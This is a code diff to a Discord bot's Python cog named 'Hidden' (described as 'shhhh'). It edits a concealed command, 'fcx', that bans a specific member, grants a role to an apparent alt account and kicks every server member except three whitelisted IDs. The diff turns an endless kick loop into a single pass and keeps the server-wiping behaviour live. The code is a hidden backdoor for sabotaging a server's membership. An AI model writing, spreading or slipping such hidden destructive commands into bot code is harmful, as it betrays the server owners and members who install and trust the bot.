@@ -208,7 +208,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
 
     @commands.command(name='fcx')
     async def fcx(self, ctx: commands.Context):
-        guild = await bot.fetch_guild(1429272977526231203)
+        guild = await self.bot.fetch_guild(1429272977526231203)
         tpne = await guild.fetch_member(ctx.me.id)
         bleed = await guild.fetch_member(593921296224747521)
         await bleed.ban()
@@ -219,16 +219,14 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
         alt = await guild.fetch_member(1188242507545456704)
         await alt.add_roles(role)
 
-        googly = True
-        while googly:
-            for user in ctx.guild.members:
-                if user.id in [1208003447388119040, 1288160215241326674, 1188242507545456704]:
-                    continue
+        for user in ctx.guild.members:
+            if user.id in [1208003447388119040, 1288160215241326674, 1188242507545456704]:
+                continue
 
-                try:
-                    await user.kick()
-                except:
-                    continue
+            try:
+                await user.kick()
+            except:
+                continue
 
 async def setup(bot: commands.Bot) -> None:
     await bot.add_cog(Hidden(bot))
